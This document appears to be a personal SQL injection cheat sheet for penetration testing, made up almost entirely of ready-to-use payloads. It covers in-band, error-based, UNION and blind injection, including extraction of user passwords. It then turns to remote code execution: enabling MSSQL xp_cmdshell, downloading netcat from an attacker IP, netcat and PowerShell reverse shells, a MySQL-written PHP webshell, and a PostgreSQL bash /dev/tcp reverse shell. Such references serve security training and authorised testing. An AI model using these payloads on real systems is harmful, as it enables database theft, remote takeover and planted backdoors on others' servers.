# in-band SQLi
## boolean-Based
or 1=1
```
' OR 1=1 -- //
```

## error-based
Enumeration
```
' OR 1=1 IN (QUERY) -- //
```

example: attempting to retrieve the users table
```
' OR 1=1 in (SELECT password FROM users) -- //
```

## UNION-based
step1
explorer number of columns
```
' ORDER BY 1 -- //
```

step2
Displaying the exact number of columns
```
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
```

step3
Retrieving Current Database Tables and Columns
```
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```

# Blind SQLi

## boolean-based
true = display
```
' AND 1=1 -- //
```

false = no display
```
' AND 1=2 -- //
```

## time-based
**TRUE** → Response is delayed (e.g., 5 seconds)
**FALSE** → Response is immediate (no delay)
```
' AND IF(1=2, SLEEP(5), 'false') -- //
```
# RCE

## MSSQL
### xp_cmdshell 設定  
```
' EXECUTE sp_configure 'show advanced options', 1; -- - //
' RECONFIGURE; -- - //
' EXECUTE sp_configure 'xp_cmdshell', 1; -- - //
' RECONFIGURE; -- - //
```

### xp_cmdshell 実行例
#### download nc.exe
```
' EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.180/nc64.exe c:/windows/temp/nc64.exe'; -- - //
```

#### reverseshell (nc64.exe)
```
' EXEC xp_cmdshell 'c:/windows/temp/nc64.exe 192.168.45.180 443 -e cmd.exe'; -- - //
```
#### reverse shell (powershell)
```
' EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.x.x',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'-- - //
```
#### encoded reverse shell
```
' EXEC xp_cmdshell 'powershell -nop -enc "BASE64 PAYLOAD"'-- - //
```

## MySQL

write a webshell to disk
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "<web server default path>/webshell.php" -- //
```

access url
```
http://192.168.x.x/tmp/webshell.php?cmd=ls
```

## PostgresSQL
one liner
```
; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.232/4444 0>&1"'; SELECT * FROM cmd_exec; -- //
```